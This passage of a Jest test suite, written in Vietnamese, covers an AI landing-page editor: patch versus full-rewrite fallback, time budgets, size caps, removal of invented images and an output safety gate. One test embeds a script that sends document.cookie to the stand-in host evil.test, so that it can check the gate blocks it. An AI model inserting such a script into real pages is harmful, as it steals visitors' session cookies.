    expect(sentPrompt).toContain('grid grid-cols-[9rem_1fr] gap-6');
    expect(sentPrompt).toContain('BỐ CỤC AN TOÀN');
    expect(sentPrompt).toMatch(/áp dụng cho phần bạn THÊM hoặc SỬA; KHÔNG viết lại phần không được yêu cầu/);
    expect(sentPrompt).toContain('{ "title": "...", "edits": [{"find": "...", "replace": "..."}], "changeSummary": "..." }');
    expect(sentPrompt).toContain('Ba khóa: "title" (string), "edits" (array) và "changeSummary" (string).');
    expect(sentPrompt).toMatch(/MỘT câu tiếng Việt tối đa 160 ký tự, viết cho người KHÔNG rành kỹ thuật/);
    expect(sentPrompt).toMatch(/TUYỆT ĐỐI không nhắc class, CSS, pixel, tên thẻ HTML hay mã nguồn/);
    expect(sentPrompt).toContain('{"title":"...","edits":[{"find":"...","replace":"..."}],"changeSummary":"..."}');
    expect(sentPrompt).toMatch(/không đổi tên trường nào khác ngoài trường mới được yêu cầu\.\n3\) Trả về JSON/);
    expect(sentPrompt).not.toContain('Ba khóa: "title" (string), "html" (string)');
    expect(sentPrompt).toContain(baseHtml);
  });

  it('vá hỏng not_found, trang nhỏ, còn giờ → 2 lần gọi, lần 2 là prompt CŨ, log strategy=patch_fallback_full patchFail=not_found', async () => {
    generateWithBudget
      .mockResolvedValueOnce(patchResponse([{ find: '<h1>Không có đoạn này</h1>', replace: 'x' }]))
      .mockResolvedValueOnce(fullResponse(patchedHtml));
    const result = await edit();
    expect(generateWithBudget).toHaveBeenCalledTimes(2);
    expect(promptOf(0)).not.toContain('"html" là TOÀN BỘ');
    expect(promptOf(1)).toContain('"html" là TOÀN BỘ');
    expect(generateWithBudget.mock.calls[1][1].timeoutMs).toBe(120000);
    expect(generateWithBudget.mock.calls[1][1].metadata).toEqual({ actorUserId: 1, mode: 'edit' });
    expect(result.html).toBe(patchedHtml);
    expect(doneLogOf(logSpy)).toMatch(/ strategy=patch_fallback_full patchFail=not_found$/);
  });

  it.each([
    ['not_found', () => patchResponse([{ find: '<h1>Không có</h1>', replace: 'x' }])],
    ['ambiguous', () => patchResponse([{ find: 'input', replace: 'x' }])],
    // `edits` không phải mảng và không có html: vẫn là vá hỏng 'empty' (còn `edits: []` là "không cần sửa", xem khối B-13 bên dưới).
    ['empty', () => ({ text: JSON.stringify({ title: 'T', changeSummary: 'x' }), blockReason: null, finishReason: 'STOP' })],
    ['invalid', () => patchResponse([{ replace: 'x' }])],
    ['parse', () => ({ text: 'không phải JSON', blockReason: null, finishReason: 'STOP' })],
  ])('vá hỏng: %s → dự phòng viết lại cả trang, log patchFail tương ứng', async (reason, makeResponse) => {
    generateWithBudget.mockResolvedValueOnce(makeResponse()).mockResolvedValueOnce(fullResponse(patchedHtml));
    const result = await edit();
    expect(generateWithBudget).toHaveBeenCalledTimes(2);
    expect(result.html).toBe(patchedHtml);
    expect(doneLogOf(logSpy)).toContain(`strategy=patch_fallback_full patchFail=${reason}`);
    expect(doneLogOf(logSpy)).not.toContain('patchEdits=');
  });

  // B-13: `edits: []` = AI xem trang rồi thấy không cần sửa — không phải "vá hỏng", không được tốn thêm lượt viết lại cả trang.
  describe('B-13 — edits: [] nghĩa là "không cần sửa"', () => {
    it('1 lần gọi (KHÔNG dự phòng viết lại cả trang), trả NGUYÊN trang + changeSummary của AI + cờ noChange, log patchEdits=0 không patchFail', async () => {
      generateWithBudget.mockResolvedValue({
        text: JSON.stringify({ title: 'T', edits: [], changeSummary: 'Trang đã đúng yêu cầu của bạn' }),
        blockReason: null,
        finishReason: 'STOP',
      });
      const result = await edit();
      expect(generateWithBudget).toHaveBeenCalledTimes(1);
      expect(result.html).toBe(baseHtml);
      expect(result.noChange).toBe(true);
      expect(result.changeSummary).toBe('Trang đã đúng yêu cầu của bạn');
      expect(doneLogOf(logSpy)).toMatch(/ strategy=patch patchEdits=0$/);
      expect(doneLogOf(logSpy)).not.toContain('patchFail');
    });

    it('AI không kèm changeSummary → câu mặc định "Không cần thay đổi" (en: "No changes were needed")', async () => {
      generateWithBudget.mockResolvedValue({ text: JSON.stringify({ title: 'T', edits: [] }), blockReason: null, finishReason: 'STOP' });
      expect((await edit()).changeSummary).toBe('Không cần thay đổi');
      generateWithBudget.mockResolvedValue({ text: JSON.stringify({ title: 'T', edits: [] }), blockReason: null, finishReason: 'STOP' });
      expect((await edit({ contentLocale: 'en' })).changeSummary).toBe('No changes were needed');
    });

    it('lượt tự sửa hiển thị (miễn phí) cũng không bị buộc viết lại: 1 lần gọi, trang giữ nguyên', async () => {
      generateWithBudget.mockResolvedValue({ text: JSON.stringify({ title: 'T', edits: [] }), blockReason: null, finishReason: 'STOP' });
      const result = await edit({ autoLayoutFix: true, layoutFindingsCount: 1 });
      expect(generateWithBudget).toHaveBeenCalledTimes(1);
      expect(result.html).toBe(baseHtml);
      expect(result.noChange).toBe(true);
    });

    it('vá bình thường (có edit) KHÔNG mang cờ noChange', async () => {
      generateWithBudget.mockResolvedValue(patchResponse([goodEdit]));
      expect(await edit()).not.toHaveProperty('noChange');
    });
  });

  it('vá hỏng, trang 80.001 ký tự → 1 lần gọi, 422 LANDING_PATCH_FAILED câu "mô tả cụ thể hơn"', async () => {
    generateWithBudget.mockResolvedValue(patchResponse([{ find: '<h1>Không có</h1>', replace: 'x' }]));
    await expect(edit({ currentHtml: htmlOfLength(MAX_FULL_REWRITE_HTML_CHARS + 1) })).rejects.toMatchObject({
      status: 422,
      code: 'LANDING_PATCH_FAILED',
      message: expect.stringContaining('mô tả cụ thể hơn'),
    });
    expect(generateWithBudget).toHaveBeenCalledTimes(1);
  });

  it('vá hỏng, trang đúng 80.000 ký tự và còn giờ → vẫn dự phòng (trần dùng <=, không phải <)', async () => {
    const page = htmlOfLength(MAX_FULL_REWRITE_HTML_CHARS);
    let now = 1_000_000;
    const nowSpy = jest.spyOn(Date, 'now').mockImplementation(() => now);
    try {
      generateWithBudget
        .mockImplementationOnce(async () => {
          now += 1000; // 1000 + 80.000 × 0,9 = 73.000 ≤ 85.000
          return patchResponse([{ find: '<h1>Không có</h1>', replace: 'x' }]);
        })
        .mockResolvedValueOnce(fullResponse(page));
      await edit({ currentHtml: page });
      expect(generateWithBudget).toHaveBeenCalledTimes(2);
    } finally {
      nowSpy.mockRestore();
    }
  });

  describe('ngân sách thời gian dự phòng: elapsed + ước tính viết lại ≤ EDIT_TIME_BUDGET_MS', () => {
    const PAGE_CHARS = 10000;
    const estFullMs = PAGE_CHARS * EDIT_FULL_REWRITE_MS_PER_CHAR; // 9000
    const runWithFakeClock = async (elapsedMs, firstResponse) => {
      const page = htmlOfLength(PAGE_CHARS);
      let now = 1_000_000;
      const nowSpy = jest.spyOn(Date, 'now').mockImplementation(() => now);
      generateWithBudget
        .mockImplementationOnce(async () => {
          now += elapsedMs;
          if (firstResponse instanceof Error) throw firstResponse;
          return firstResponse;
        })
        .mockResolvedValueOnce(fullResponse(page));
      try {
        return await edit({ currentHtml: page });
      } finally {
        nowSpy.mockRestore();
      }
    };
    const notFound = () => patchResponse([{ find: '<h1>Không có</h1>', replace: 'x' }]);

    it('elapsed + est ĐÚNG bằng ngân sách → vẫn dự phòng (2 lần gọi)', async () => {
      await runWithFakeClock(EDIT_TIME_BUDGET_MS - estFullMs, notFound());
      expect(generateWithBudget).toHaveBeenCalledTimes(2);
    });

    it('elapsed + est vượt ngân sách 1 ms → KHÔNG dự phòng: 1 lần gọi, 422', async () => {
      await expect(runWithFakeClock(EDIT_TIME_BUDGET_MS - estFullMs + 1, notFound())).rejects.toMatchObject({
        status: 422,
        code: 'LANDING_PATCH_FAILED',
        message: expect.stringContaining('mô tả cụ thể hơn'),
      });
      expect(generateWithBudget).toHaveBeenCalledTimes(1);
    });

    it('lượt vá ném AbortError (quá giờ) → không thử lại, 422 câu "chia nhỏ" khi không đủ giờ dự phòng', async () => {
      const abort = Object.assign(new Error('The operation was aborted'), { name: 'AbortError' });
      await expect(runWithFakeClock(EDIT_TIME_BUDGET_MS, abort)).rejects.toMatchObject({
        status: 422,
        code: 'LANDING_PATCH_FAILED',
        message: expect.stringContaining('chia nhỏ'),
      });
      expect(generateWithBudget).toHaveBeenCalledTimes(1);
      expect(doneLogOf(logSpy)).toContain('patchFail=timeout');
    });

    it('AbortError nhưng còn giờ (trang nhỏ, hỏng nhanh) → coi là hỏng vá timeout và dự phòng', async () => {
      const abort = Object.assign(new Error('The operation was aborted'), { name: 'AbortError' });
      await runWithFakeClock(1000, abort);
      expect(generateWithBudget).toHaveBeenCalledTimes(2);
      expect(doneLogOf(logSpy)).toContain('strategy=patch_fallback_full patchFail=timeout');
    });
  });

  it('finishReason MAX_TOKENS ở lượt vá → hỏng vá (truncated), KHÔNG ném câu "AI sinh HTML quá dài" của chốt kiểm', async () => {
    generateWithBudget.mockResolvedValue({ ...patchResponse([goodEdit]), finishReason: 'MAX_TOKENS' });
    await expect(edit({ currentHtml: htmlOfLength(MAX_FULL_REWRITE_HTML_CHARS + 1) })).rejects.toMatchObject({
      status: 422,
      code: 'LANDING_PATCH_FAILED',
    });
    expect(generateWithBudget).toHaveBeenCalledTimes(1);
    expect(doneLogOf(logSpy)).toContain('patchFail=truncated');
  });

  it('finishReason MAX_TOKENS, trang nhỏ → dự phòng, log patchFail=truncated', async () => {
    generateWithBudget
      .mockResolvedValueOnce({ ...patchResponse([goodEdit]), finishReason: 'MAX_TOKENS' })
      .mockResolvedValueOnce(fullResponse(patchedHtml));
    const result = await edit();
    expect(result.html).toBe(patchedHtml);
    expect(doneLogOf(logSpy)).toContain('strategy=patch_fallback_full patchFail=truncated');
  });

  it('model trả {title, html} ở chế độ vá → dùng html, strategy=patch_full_html, 1 lần gọi', async () => {
    generateWithBudget.mockResolvedValue(fullResponse(patchedHtml));
    const result = await edit();
    expect(generateWithBudget).toHaveBeenCalledTimes(1);
    expect(result.html).toBe(patchedHtml);
    expect(doneLogOf(logSpy)).toMatch(/ strategy=patch_full_html$/);
  });

  it('vá làm mất form data-founderai-capture → 422 từ chốt kiểm, KHÔNG dự phòng (1 lần gọi)', async () => {
    generateWithBudget.mockResolvedValue(
      patchResponse([{ find: '<form data-founderai-capture>', replace: '<form>' }])
    );
    await expect(edit()).rejects.toMatchObject({
      status: 422,
      message: expect.stringContaining('mất form đăng ký'),
    });
    expect(generateWithBudget).toHaveBeenCalledTimes(1);
    expect(doneLogOf(logSpy)).not.toContain('patchFail=');
  });

  it('vá chèn URL ảnh bịa → lượt 2 sạch: 2 lần gọi, cả hai là prompt vá, fakeImageRetry=1', async () => {
    const fakeUrl = 'https://fake.cdn.com/fake-patch.png';
    generateWithBudget
      .mockResolvedValueOnce(patchResponse([{ find: '<h1>Khoá học Alpha</h1>', replace: `<h1>Khoá học Alpha</h1><img src="${fakeUrl}">` }]))
      .mockResolvedValueOnce(patchResponse([goodEdit]));
    const result = await edit({ instruction: 'Thêm ảnh' });
    expect(generateWithBudget).toHaveBeenCalledTimes(2);
    for (const i of [0, 1]) {
      expect(promptOf(i)).toContain('"edits"');
      expect(promptOf(i)).not.toContain('"html" là TOÀN BỘ');
    }
    expect(promptOf(1)).toContain(fakeUrl);
    expect(promptOf(1)).not.toContain('Sinh lại toàn bộ trang');
    expect(result.html).toBe(patchedHtml);
    expect(result).not.toHaveProperty('strippedImageUrls');
    expect(doneLogOf(logSpy)).toContain('fakeImageRetry=1');
  });

  it('lượt vá thứ 2 (sinh lại vì ảnh bịa) chỉ được PHẦN NGÂN SÁCH CÒN LẠI làm timeout, không trọn 85 giây', async () => {
    const fakeUrl = 'https://fake.cdn.com/fake-timeout.png';
    let now = 1_000_000;
    const nowSpy = jest.spyOn(Date, 'now').mockImplementation(() => now);
    generateWithBudget
      .mockImplementationOnce(async () => {
        now += 30000;
        return patchResponse([{ find: '<h1>Khoá học Alpha</h1>', replace: `<h1>Khoá học Alpha</h1><img src="${fakeUrl}">` }]);
      })
      .mockResolvedValueOnce(patchResponse([goodEdit]));
    try {
      await edit({ instruction: 'Thêm ảnh' });
    } finally {
      nowSpy.mockRestore();
    }
    expect(generateWithBudget).toHaveBeenCalledTimes(2);
    expect(generateWithBudget.mock.calls[0][1].timeoutMs).toBe(EDIT_TIME_BUDGET_MS);
    expect(generateWithBudget.mock.calls[1][1].timeoutMs).toBe(EDIT_TIME_BUDGET_MS - 30000);
  });

  it('AI không trả title ở lượt vá → lấy <title> của trang sau khi ghép, KHÔNG rơi về "Landing"', async () => {
    const withTitle = baseHtml.replace('<head>', '<head><title>Chuyển giao bản quyền AI</title>');
    generateWithBudget.mockResolvedValue(patchResponse([goodEdit], { title: '' }));
    const result = await edit({ currentHtml: withTitle });
    expect(result.title).toBe('Chuyển giao bản quyền AI');
    expect(result.html).toBe(withTitle.replace('<h1>Khoá học Alpha</h1>', '<h1>Khoá học Beta</h1>'));
  });

  it('503 quá tải ở lượt vá → ném nguyên, 1 lần gọi, KHÔNG dự phòng', async () => {
    const overloaded = Object.assign(new Error('Model overloaded'), { status: 503 });
    generateWithBudget.mockRejectedValue(overloaded);
    await expect(edit()).rejects.toBe(overloaded);
    expect(generateWithBudget).toHaveBeenCalledTimes(1);
    expect(doneLogOf(logSpy)).not.toContain('patchFail=');
  });

  it('blockReason ở lượt vá → 400 như cũ, KHÔNG dự phòng', async () => {
    generateWithBudget.mockResolvedValue({ text: '', blockReason: 'SAFETY', finishReason: 'SAFETY' });
    await expect(edit()).rejects.toMatchObject({ status: 400 });
    expect(generateWithBudget).toHaveBeenCalledTimes(1);
  });

  // B-3 (rà soát AI 03/10): lượt tự sửa hiển thị KHÔNG trừ credit → không được là đường AI đắt: luôn đi đường vá, trần đầu
  // vào riêng 150.000, không dự phòng viết-lại-cả-trang, không sinh lại (ảnh bịa → gỡ, trượt chốt an toàn → báo lỗi).
  describe('B-3 — lượt tự sửa hiển thị MIỄN PHÍ (autoLayoutFix)', () => {
    const autoEdit = (over = {}) => edit({ autoLayoutFix: true, layoutFindingsCount: 1, ...over });
    const badPatch = patchResponse([{ find: '<h1>Không có đoạn này</h1>', replace: 'x' }]);
    const AUTO_FIX_CAP = 150000;

    it('vá hỏng (not_found) → KHÔNG rơi xuống viết-lại-cả-trang: 1 lần gọi + 422 LANDING_PATCH_FAILED; lượt thường cùng ca vẫn dự phòng (2 lần)', async () => {
      generateWithBudget.mockResolvedValue(badPatch);
      await expect(autoEdit()).rejects.toMatchObject({ status: 422, code: 'LANDING_PATCH_FAILED' });
      expect(generateWithBudget).toHaveBeenCalledTimes(1);
      expect(promptOf(0)).not.toContain('"html" là TOÀN BỘ');

      generateWithBudget.mockReset();
      generateWithBudget.mockResolvedValueOnce(badPatch).mockResolvedValueOnce(fullResponse(patchedHtml));
      await edit();
      expect(generateWithBudget).toHaveBeenCalledTimes(2);
    });

    it('công tắc AI_LANDING_EDIT_MODE=full + autoLayoutFix → VẪN đi đường vá (prompt vá, 1 lần gọi, strategy=patch)', async () => {
      generateWithBudget.mockResolvedValue(patchResponse([goodEdit]));
      const result = await withEditMode('full', () => autoEdit());
      expect(generateWithBudget).toHaveBeenCalledTimes(1);
      expect(promptOf(0)).toContain('"edits"');
      expect(promptOf(0)).not.toContain('"html" là TOÀN BỘ');
      expect(result.html).toBe(patchedHtml);
      expect(doneLogOf(logSpy)).toContain('strategy=patch ');
      expect(generateWithBudget.mock.calls[0][1].metadata).toEqual({ actorUserId: 1, mode: 'edit', strategy: 'patch', autoLayoutFix: true });
    });

    it('trần đầu vào riêng 150.000: đúng 150.000 qua; 150.001 → 400, KHÔNG gọi model; lượt thường 150.001 vẫn qua', async () => {
      generateWithBudget.mockResolvedValue(patchResponse([goodEdit]));
      await expect(autoEdit({ currentHtml: htmlOfLength(AUTO_FIX_CAP) })).resolves.toMatchObject({ title: 'T' });
      expect(generateWithBudget).toHaveBeenCalledTimes(1);

      generateWithBudget.mockClear();
      await expect(autoEdit({ currentHtml: htmlOfLength(AUTO_FIX_CAP + 1) })).rejects.toMatchObject({
        status: 400,
        message: expect.stringContaining('150.000'),
      });
      expect(generateWithBudget).not.toHaveBeenCalled();

      await expect(edit({ currentHtml: htmlOfLength(AUTO_FIX_CAP + 1) })).resolves.toMatchObject({ title: 'T' });
      expect(generateWithBudget).toHaveBeenCalledTimes(1);
    });

    it('vá chèn ảnh bịa → GỠ ảnh luôn, KHÔNG sinh lại (1 lần gọi, fakeImageRetry=0); lượt thường sinh lại (2 lần)', async () => {
      const fakeUrl = 'https://fake.cdn.com/fake-auto.png';
      const withFake = patchResponse([{ find: '<h1>Khoá học Alpha</h1>', replace: `<h1>Khoá học Alpha</h1><img src="${fakeUrl}">` }]);
      generateWithBudget.mockResolvedValue(withFake);
      const result = await autoEdit();
      expect(generateWithBudget).toHaveBeenCalledTimes(1);
      expect(result.strippedImageUrls).toEqual([fakeUrl]);
      expect(result.html).not.toContain(fakeUrl);
      expect(doneLogOf(logSpy)).toContain('fakeImageRetry=0');

      generateWithBudget.mockReset();
      generateWithBudget.mockResolvedValueOnce(withFake).mockResolvedValueOnce(patchResponse([goodEdit]));
      await edit();
      expect(generateWithBudget).toHaveBeenCalledTimes(2);
    });

    it('vá trượt chốt an toàn → 422 LANDING_UNSAFE_OUTPUT sau ĐÚNG 1 lần gọi (không sinh lại); lượt thường sinh lại (2 lần)', async () => {
      const steal = '<script>fetch("https://evil.test/c", { body: document.cookie })</script>';
      const unsafe = patchResponse([{ find: '<h1>Khoá học Alpha</h1>', replace: `<h1>Khoá học Alpha</h1>${steal}` }]);
      generateWithBudget.mockResolvedValue(unsafe);
      await expect(autoEdit()).rejects.toMatchObject({ status: 422, code: 'LANDING_UNSAFE_OUTPUT' });
      expect(generateWithBudget).toHaveBeenCalledTimes(1);

      generateWithBudget.mockReset();
      generateWithBudget.mockResolvedValueOnce(unsafe).mockResolvedValueOnce(patchResponse([goodEdit]));
      await edit();
      expect(generateWithBudget).toHaveBeenCalledTimes(2);
    });
  });

  describe('công tắc AI_LANDING_EDIT_MODE (đọc lúc gọi)', () => {
    it('full → 1 lần gọi prompt CŨ, metadata không có strategy, log strategy=full', async () => {
      generateWithBudget.mockResolvedValue(fullResponse(patchedHtml));
      await withEditMode('full', () => edit());
      expect(generateWithBudget).toHaveBeenCalledTimes(1);
      expect(promptOf(0)).toContain('"html" là TOÀN BỘ');
      expect(promptOf(0)).not.toContain('"edits"');
      expect(generateWithBudget.mock.calls[0][1].metadata).toEqual({ actorUserId: 1, mode: 'edit' });
      expect(generateWithBudget.mock.calls[0][1].timeoutMs).toBe(120000);
      expect(doneLogOf(logSpy)).toMatch(/ strategy=full$/);
    });

    it('full: trang 80.001 ký tự → 400 "giới hạn 80.000", không gọi AI', async () => {
      await withEditMode('full', async () => {
        await expect(edit({ currentHtml: htmlOfLength(MAX_FULL_REWRITE_HTML_CHARS + 1) })).rejects.toMatchObject({
          status: 400,
          message: expect.stringContaining('giới hạn 80.000 ký tự'),
        });
      });
      expect(generateWithBudget).not.toHaveBeenCalled();
    });

    it('bật/tắt trong CÙNG file: full rồi bỏ biến → lượt sau lại là chế độ vá', async () => {
      generateWithBudget.mockResolvedValue(fullResponse(patchedHtml));
      await withEditMode('full', () => edit());
      expect(promptOf(0)).toContain('"html" là TOÀN BỘ');
      generateWithBudget.mockResolvedValue(patchResponse([goodEdit]));
      await withEditMode(undefined, () => edit());
      expect(promptOf(1)).toContain('"edits"');
      expect(promptOf(1)).not.toContain('"html" là TOÀN BỘ');
    });

    it('giá trị lạ (không phải "full") → vẫn chế độ vá', async () => {
      generateWithBudget.mockResolvedValue(patchResponse([goodEdit]));
      await withEditMode('patch', () => edit());
      expect(promptOf(0)).toContain('"edits"');
    });
  });

  describe('trần độ dài chế độ vá (MAX_EDIT_HTML_INPUT_CHARS = 500.000)', () => {
    it('trang đúng 500.000 ký tự → gọi AI (bản vá áp lên trang lớn)', async () => {
      const page = htmlOfLength(MAX_EDIT_HTML_INPUT_CHARS);
      expect(page).toHaveLength(500000);
      generateWithBudget.mockResolvedValue(patchResponse([goodEdit]));
      const result = await edit({ currentHtml: page });
      expect(generateWithBudget).toHaveBeenCalledTimes(1);
      expect(result.html).toBe(page.replace(goodEdit.find, goodEdit.replace));
    });

    it('trang 500.001 ký tự → 400 "giới hạn 500.000", KHÔNG gọi AI', async () => {
      await expect(edit({ currentHtml: htmlOfLength(MAX_EDIT_HTML_INPUT_CHARS + 1) })).rejects.toMatchObject({
        status: 400,
        message: expect.stringContaining('500.001 ký tự, giới hạn 500.000 ký tự'),
      });
      expect(generateWithBudget).not.toHaveBeenCalled();
    });
  });
});
